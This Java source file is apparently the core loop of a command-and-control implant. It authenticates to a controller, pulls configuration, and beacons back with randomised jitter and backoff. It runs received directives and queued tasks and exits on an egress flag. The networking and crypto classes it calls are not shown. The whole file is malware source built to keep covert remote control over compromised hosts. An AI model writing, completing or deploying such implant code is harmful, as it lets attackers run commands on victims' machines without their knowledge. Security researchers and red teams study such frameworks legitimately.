package agent;

import java.lang.reflect.InvocationTargetException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Set;
import java.util.concurrent.TimeUnit;

public class Core {
	static public int noAct = 0;
	public static void handle(Hashtable keepAlive) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, InterruptedException, NoSuchAlgorithmException {
		if (Integer.parseInt(keepAlive.get("directives").toString()) > 0) {
			Proc.ingest();
			noAct = 0;
		} else {
			int jitterActual = Util.numrand((int) Main.config.get("jitterMin"), (int) Main.config.get("jitterMax"));
			if (Main.session == 1) {
				TimeUnit.MILLISECONDS.sleep(jitterActual);
			} else {
				if (noAct < 500) {
					TimeUnit.MILLISECONDS.sleep((noAct*(noAct/2)+jitterActual));
				} else {
					noAct = 0;
				}
				
				noAct += 1;
			}
		}
		beacon();
	}
	
	public static Hashtable setup() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException {
		Hashtable finalConf = new Hashtable();
		Hashtable authResult = Netw.send("Auth",null,null,null);
		Main.config.put("lysessid",authResult.get("cookieDough"));
		finalConf = Netw.send("Conf",null,authResult.get("key").toString(),Crypt.bake());
		return finalConf;
	}

	
	public static void weaver() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
		Enumeration jobs = Main.schtasks.keys();
		int maxChk = 0;
		String taskHandle = new String();
		while (jobs.hasMoreElements()) {
			
			if (Main.channels <= (int) Main.config.get("maxChannel")) {
				if (maxChk == 0) {
					taskHandle = (String) jobs.nextElement();
				} else {
					maxChk = 0;
				}
				Util.detask(taskHandle);
			} else {
				maxChk = 1;
			}
		}
	}
	
	public static void beacon() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, InterruptedException, NoSuchAlgorithmException {
		//beacon function
		weaver();
		if (Main.egress == 1) {
			System.exit(0);
		}
		Hashtable keepAlive = Netw.send("Pulse",null,Util.strand(8),Crypt.bake());
		handle(keepAlive);
	}
	
	public static void init() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, InterruptedException, NoSuchAlgorithmException {
		beacon();
	}
}
